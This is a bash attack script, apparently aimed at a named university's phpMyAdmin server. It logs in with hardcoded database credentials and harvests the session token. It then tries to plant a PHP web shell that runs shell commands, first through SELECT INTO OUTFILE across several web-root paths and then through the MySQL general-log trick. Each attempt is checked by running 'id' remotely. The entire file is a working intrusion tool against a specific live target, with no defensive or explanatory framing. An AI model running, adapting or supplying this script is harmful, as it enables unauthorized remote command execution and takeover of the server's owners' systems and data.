#!/bin/bash

URL="https://olympic.su.ac.th/phpmyadmin/"
COOKIES="/tmp/pmacookies.txt"

# 登录获取token
echo "[*] 登录获取token..."
curl -k -s -c "$COOKIES" "$URL" > /dev/null
TOKEN=$(curl -k -s -b "$COOKIES" -c "$COOKIES" -X POST "${URL}index.php" \
  -d "pma_username=mysql&pma_password=Mu123.123.&server=1" -L | \
  grep -oP 'token=\K[^"&]+' | head -1)

if [ -z "$TOKEN" ]; then
  echo "[-] 获取token失败"
  exit 1
fi

echo "[+] Token: $TOKEN"

# 尝试写入shell
WEB_PATHS=(
  "/var/www/html"
  "/var/www"
  "/usr/share/nginx/html"
  "/var/www/phpmyadmin/../html"
  "/home/www/html"
  "/opt/lampp/htdocs"
)

SHELL_NAME="shell.php"
SHELL_CODE="<?php system(\$_GET[\"cmd\"]); ?>"

echo "[*] 尝试写入webshell..."

for path in "${WEB_PATHS[@]}"; do
  echo "[*] 尝试: $path/$SHELL_NAME"
  
  # 写入shell
  RESPONSE=$(curl -k -s -b "$COOKIES" \
    "${URL}server_sql.php?db=mysql&token=$TOKEN" \
    -d "sql_query=SELECT '$SHELL_CODE' INTO OUTFILE '$path/$SHELL_NAME';" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded")
  
  # 检查是否成功（不包含错误关键词）
  if ! echo "$RESPONSE" | grep -qi "error\|1064\|1045\|access denied"; then
    echo "[+] 可能写入成功，验证中..."
    
    # 验证shell
    sleep 1
    TEST=$(curl -k -s "https://olympic.su.ac.th/$SHELL_NAME?cmd=id" 2>/dev/null)
    
    if echo "$TEST" | grep -q "uid="; then
      echo "[+] Shell写入成功!"
      echo "[+] URL: https://olympic.su.ac.th/$SHELL_NAME"
      echo "[+] 测试: https://olympic.su.ac.th/$SHELL_NAME?cmd=id"
      exit 0
    fi
  fi
done

# 备选方案：日志文件
echo "[*] 尝试日志文件方法..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SET GLOBAL general_log_file = '/var/www/html/shell.php';" \
  -X POST > /dev/null

curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SET GLOBAL general_log = 'ON';" \
  -X POST > /dev/null

curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT '$SHELL_CODE';" \
  -X POST > /dev/null

curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SET GLOBAL general_log = 'OFF';" \
  -X POST > /dev/null

sleep 1
TEST=$(curl -k -s "https://olympic.su.ac.th/shell.php?cmd=id" 2>/dev/null)
if echo "$TEST" | grep -q "uid="; then
  echo "[+] Shell写入成功(日志方法)!"
  echo "[+] URL: https://olympic.su.ac.th/shell.php?cmd=id"
  exit 0
fi

echo "[-] 所有方法失败，尝试查询web目录..."
# 查询实际路径
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SHOW VARIABLES LIKE 'datadir';" \
  -X POST | grep -oP '<td class="value">[^<]+</td>' | head -3
